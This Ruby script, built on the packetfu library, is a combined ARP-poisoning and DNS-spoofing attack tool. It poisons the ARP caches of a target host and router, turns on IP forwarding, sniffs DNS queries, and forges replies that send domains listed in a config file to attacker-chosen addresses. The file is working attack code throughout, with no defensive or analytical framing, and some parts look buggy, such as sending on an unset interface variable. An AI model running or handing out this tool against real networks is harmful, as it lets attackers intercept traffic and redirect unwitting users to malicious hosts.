#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require 'macaddr'

include PacketFu

### User Defined ###############################

target_ip = '192.168.0.9'
router_ip = '192.168.0.100'
$iface = 'em1'
CONFIG_FILE = 'config.txt'

################################################

# Set up the rules for spoofing
$spoof_hash = Hash.new
config = File.open(CONFIG_FILE)
if(config.nil?)
  #config_error()
  exit()
end
config.each_line do |line|
  if(!line.nil? && line != "\n")
    domain, ip = line.split(' ')
    $spoof_hash[".*#{domain}"] = ip
  end

end

puts $spoof_hash
# Get the mac addresses for all the necessary machines.
sender_mac = Mac.addr
`ping -c 1 #{target_ip}`
target_mac = `arp | grep #{target_ip} | awk '{ print $3} '`
router_mac = `arp | grep #{router_ip} | awk '{ print $3} '`

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread.

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
arp_packet_target.eth_daddr = target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
arp_packet_target.arp_saddr_ip = router_ip        # router's IP
arp_packet_target.arp_daddr_ip = target_ip         # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply

# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
arp_packet_router.eth_daddr = router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
arp_packet_router.arp_saddr_ip = target_ip         # target's IP
arp_packet_router.arp_daddr_ip = router_ip        # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@interface)
    arp_packet_router.to_w(@interface)
  end
end


def check_spoof(domainName)
  $spoof_hash.each_key do |k|
    if domainName =~ /#{k}/
      return $spoof_hash[k]
    end
  end
  return nil
end

def sendResponse(packet, domainName, spoof_ip)
  # Convert the IP address
  myIP = spoof_ip.split(".")
  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')

  # Create the UDP packet
  response = UDPPacket.new
  response.udp_src = packet.udp_dst
  response.udp_dst = packet.udp_src
  response.ip_saddr = packet.ip_daddr
  response.ip_daddr = packet.ip_saddr
  response.eth_daddr = packet.eth_saddr

  # Transaction ID
  response.payload = packet.payload[0,2]

  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

  # Domain name
  domainName.split(".").each do |section|
    response.payload += section.length.chr
    response.payload += section
  end

  # Set more default values...........
  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"

  # IP
  response.payload += myIP2

  # Calculate the packet
  response.recalc

  # Send the packet out
  response.to_w($iface)

end

def get_info(packet)
  # Get the length of the first domain level (in hex)
  len = "0x"+packet.payload[11].unpack('h*')[0].chr+packet.payload[12].unpack('h*')[0].chr

  # Start from the first letter
  i = 13;

  # Calculate the last value for the level
  last = i + len.hex

  # Initialize the domain string
  domain = String.new

  # Run in loop to handle infinite amount of levels
  x = true

  while x

    # Add the letters to the domain
    while i < last
      if packet.payload[i] != nil
        domain += packet.payload[i]
      end
      i += 1
    end

    # Get the new length for the next level(in hex)
    #if packet.payload[i] != nil
      len = "0x"+packet.payload[i].unpack('h*')[0].chr
      # Increase counter to skip the length
      i += 1

      # Stop when we get a length of 0
      # otherwise add a '.' to the domain and calculate the new length

      if len == '0x0'
        x = false
      else
        domain += '.'
        last = i + len.hex
      end
    #else
      #x = false
    #end
  end

  return domain
end

# Opens up the nic for capture.
def sniff(iface)

  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
  puts 'Sniffing...'
  cap.stream.each do |p|
    packet = Packet.parse p

    $dnsQuery = packet.payload[2].unpack('h*')[0].chr+packet.payload[3].unpack('h*')[0].chr

    if $dnsQuery == '10'
      puts "Got a DNS!: "
      domain = get_info(packet)
      puts "Checking the spoof: " + domain
      spoof_ip = check_spoof(domain)
      puts "SpoofIP: " + spoof_ip
      if !spoof_ip.nil?
        puts "sending response"
        sendResponse(packet, domain, spoof_ip)
      end

    end

  end

end

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}

  puts "Starting the sniffing thread..."
  sniff_thread = Thread.new{sniff($iface)}
  spoof_thread.join
  sniff_thread.join

    # Catch the interrupt and kill the thread
rescue Interrupt
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end